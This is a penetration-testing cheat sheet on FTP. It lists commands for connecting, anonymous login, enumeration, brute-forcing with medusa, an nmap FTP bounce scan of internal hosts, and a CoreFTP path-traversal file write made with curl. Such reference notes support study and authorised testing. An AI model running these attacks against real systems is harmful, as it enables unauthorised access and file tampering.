# FTP

## Manual FTP Connection

```bash
ftp <target_IP>
```

## Netcat FTP Connection

```bash
nc <target_IP> 21
```

## Anonymous Login

```bash
ftp <target_IP>
Username: anonymous
Password:
```

## Brute-Force (Medusa)

```bash
medusa -u <username> -P <password_list> -h <target_IP> -M ftp
```

## FTP Bounce Attack (Nmap)

```bash
nmap -Pn -v -n -p <target_port> -b anonymous:password@<ftp_server_IP> <internal_target_IP>
```

## CoreFTP Arbitrary File Write

```bash
curl -k -X PUT -H "Host: <target_IP>" --basic -u <username>:<password> --data-binary "Payload" --path-as-is https://<target_IP>/../../../../../../<filename>
```

## FTP Client Commands

```bash
ls
cd <directory>
get <filename>
mget <filename1> <filename2>
put <local_filename>
mput <local_filename1> <local_filename2>
help
```

## FTP Basics

* File transfer and directory operations.
* Port: TCP/21.
* Common issues include anonymous access and overly permissive permissions.

## Enumeration

### Nmap

```bash
nmap -sC -sV -p 21 <target_IP>
```

### Manual

* `ftp <target_IP>`
* `nc <target_IP> 21`

## Misconfigurations

* Anonymous authentication.
* Incorrect read or write permissions.

## Protocol-Specific Attacks

### Brute-Forcing

```bash
medusa -u <user> -P <passlist> -h <target_IP> -M ftp
```

### FTP Bounce Attack

```bash
nmap -b anonymous:password@<FTP_server_IP> <internal_target_IP>
```

## FTP Vulnerabilities (CoreFTP Path Traversal)

### Arbitrary File Write

```bash
curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "Payload" --path-as-is https://<IP>/../../../../../../whoops
```
